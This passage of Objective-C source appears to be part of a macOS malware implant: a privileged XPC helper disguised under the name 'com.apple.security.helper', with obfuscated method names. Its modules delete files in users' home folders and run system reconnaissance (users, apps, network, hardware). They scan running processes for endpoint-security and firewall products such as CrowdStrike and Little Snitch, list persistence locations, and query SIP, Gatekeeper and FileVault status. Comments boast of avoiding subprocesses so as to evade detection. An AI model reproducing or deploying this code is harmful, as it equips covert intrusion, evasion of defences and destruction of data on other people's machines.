            NSString *p = [NSString stringWithFormat:@"/Users/%@/%@", u, h];
            if ([fm fileExistsAtPath:p]) {
                [fm removeItemAtPath:p error:nil];
                [out appendFormat:@"removed %@\n", p];
            }
        }
    }
    r(YES, out, nil);
}

/* ── Module 10: System Recon ── */

- (void)q27:(void (^)(NSDictionary *, NSError *))r {
    NSMutableDictionary *dx = [NSMutableDictionary new];
    /* OS info via sysctl — no subprocess */
    char osver[256] = {0}; size_t len = sizeof(osver);
    sysctlbyname("kern.osproductversion", osver, &len, NULL, 0);
    char osrel[256] = {0}; len = sizeof(osrel);
    sysctlbyname("kern.osrelease", osrel, &len, NULL, 0);
    char model[256] = {0}; len = sizeof(model);
    sysctlbyname("hw.model", model, &len, NULL, 0);
    char cpu[256] = {0}; len = sizeof(cpu);
    sysctlbyname("machdep.cpu.brand_string", cpu, &len, NULL, 0);
    int ncpu = 0; len = sizeof(ncpu);
    sysctlbyname("hw.ncpu", &ncpu, &len, NULL, 0);
    int64_t mem = 0; len = sizeof(mem);
    sysctlbyname("hw.memsize", &mem, &len, NULL, 0);
    char hostname[256] = {0};
    gethostname(hostname, sizeof(hostname));

    dx[@"os_version"] = [NSString stringWithUTF8String:osver];
    dx[@"os_release"] = [NSString stringWithUTF8String:osrel];
    dx[@"hw_model"]   = [NSString stringWithUTF8String:model];
    dx[@"cpu"]        = [NSString stringWithUTF8String:cpu];
    dx[@"ncpu"]       = @(ncpu);
    dx[@"memory_gb"]  = [NSString stringWithFormat:@"%.1f", mem / 1073741824.0];
    dx[@"hostname"]   = [NSString stringWithUTF8String:hostname];

    /* Users via directory listing — no dscl subprocess */
    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray *users = [fm contentsOfDirectoryAtPath:@"/Users" error:nil];
    NSMutableArray *realUsers = [NSMutableArray new];
    for (NSString *u in users) {
        if (![u hasPrefix:@"."] && ![u isEqualToString:@"Shared"])
            [realUsers addObject:u];
    }
    dx[@"users"] = [realUsers componentsJoinedByString:@", "];

    dx[@"apps"] = native_ls(@"/Applications");
    dx[@"network"] = native_interfaces();

    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    dx[@"uptime_hours"] = [NSString stringWithFormat:@"%.1f", ts.tv_sec / 3600.0];

    r(dx, nil);
}

- (void)q28:(void (^)(NSDictionary *, NSError *))r {
    NSMutableDictionary *dx = [NSMutableDictionary new];
    /* Check running processes via libproc — no ps subprocess */
    int count = proc_listallpids(NULL, 0);
    pid_t *pids = calloc(count, sizeof(pid_t));
    count = proc_listallpids(pids, count * sizeof(pid_t));

    NSMutableString *allPaths = [NSMutableString new];
    for (int i = 0; i < count; i++) {
        char path[PROC_PIDPATHINFO_MAXSIZE] = {0};
        proc_pidpath(pids[i], path, sizeof(path));
        if (path[0]) [allPaths appendFormat:@"%s\n", path];
    }
    free(pids);

    NSDictionary *tools = @{
        @"CrowdStrike":  @[@"falcond", @"falcon-sensor", @"CSFalconService"],
        @"SentinelOne":  @[@"sentineld", @"SentinelAgent"],
        @"CarbonBlack":  @[@"cbdaemon", @"cbagent", @"CbDefense"],
        @"Defender":     @[@"wdavdaemon", @"MicrosoftDefender"],
        @"Sophos":       @[@"SophosScanD", @"SophosAntiVirus"],
        @"ESET":         @[@"esets_daemon"],
        @"Malwarebytes": @[@"RTProtectionDaemon"],
        @"LittleSnitch": @[@"LittleSnitch", @"littlesnitch"],
        @"LuLu":         @[@"LuLu"],
        @"BlockBlock":   @[@"BlockBlock"],
        @"Jamf":         @[@"jamf", @"JamfAgent"],
        @"Kandji":       @[@"kandji-daemon"],
        @"osquery":      @[@"osqueryd"],
        @"Santa":        @[@"santad"],
    };

    for (NSString *name in tools) {
        BOOL found = NO;
        for (NSString *sig in tools[name]) {
            if ([allPaths containsString:sig]) { found = YES; break; }
        }
        dx[name] = found ? @"DETECTED" : @"not_found";
    }
    r(dx, nil);
}

- (void)q29:(void (^)(NSString *, NSError *))r {
    NSMutableString *out = [NSMutableString new];
    [out appendString:@"=== System LaunchDaemons ===\n"];
    [out appendString:native_ls(@"/Library/LaunchDaemons")];
    [out appendString:@"\n\n=== System LaunchAgents ===\n"];
    [out appendString:native_ls(@"/Library/LaunchAgents")];

    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray *users = [fm contentsOfDirectoryAtPath:@"/Users" error:nil];
    for (NSString *u in users) {
        if ([u hasPrefix:@"."] || [u isEqualToString:@"Shared"]) continue;
        NSString *la = [NSString stringWithFormat:@"/Users/%@/Library/LaunchAgents", u];
        if ([fm fileExistsAtPath:la]) {
            [out appendFormat:@"\n\n=== LaunchAgents [%@] ===\n", u];
            [out appendString:native_ls(la)];
        }
    }
    [out appendString:@"\n\n=== PrivilegedHelperTools ===\n"];
    [out appendString:native_ls(@"/Library/PrivilegedHelperTools")];
    r(out, nil);
}

- (void)q30:(void (^)(NSDictionary *, NSError *))r {
    NSMutableDictionary *dx = [NSMutableDictionary new];
    int ec = 0;
    dx[@"SIP"]        = run_cmd(@"csrutil status 2>&1", &ec) ?: @"unknown";
    dx[@"Gatekeeper"] = run_cmd(@"spctl --status 2>&1", &ec) ?: @"unknown";
    dx[@"FileVault"]  = run_cmd(@"fdesetup status 2>&1", &ec) ?: @"unknown";
    dx[@"Firewall"]   = run_cmd(
        @"/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate 2>&1", &ec) ?: @"unknown";
    r(dx, nil);
}

@end

#pragma mark - Delegate

@interface QD : NSObject <NSXPCListenerDelegate>
@end

@implementation QD

- (BOOL)listener:(NSXPCListener *)listener
shouldAcceptNewConnection:(NSXPCConnection *)connection {
    NSXPCInterface *iface = [NSXPCInterface
        interfaceWithProtocol:@protocol(QP)];
    NSSet *cls = [NSSet setWithObjects:
        [NSString class], [NSArray class], [NSDictionary class],
        [NSNumber class], [NSData class], nil];
    [iface setClasses:cls forSelector:@selector(q10:a:b:z:)
        argumentIndex:1 ofReply:NO];
    [iface setClasses:cls forSelector:@selector(q10:a:b:z:)
        argumentIndex:2 ofReply:NO];
    connection.exportedInterface = iface;
    connection.exportedObject = [[QI alloc] init];
    [connection resume];
    return YES;
}

@end

#pragma mark - Main

int main(int argc, const char *argv[]) {
    @autoreleasepool {
        /* argv[1] = dynamic Mach service name */
        g_serviceName = (argc > 1) ?
            [NSString stringWithUTF8String:argv[1]] :
            @"com.apple.security.helper";

        NSXPCListener *listener = [[NSXPCListener alloc]
            initWithMachServiceName:g_serviceName];
        QD *delegate = [[QD alloc] init];
        listener.delegate = delegate;
        [listener resume];
        [[NSRunLoop currentRunLoop] run];
    }
    return 0;
}
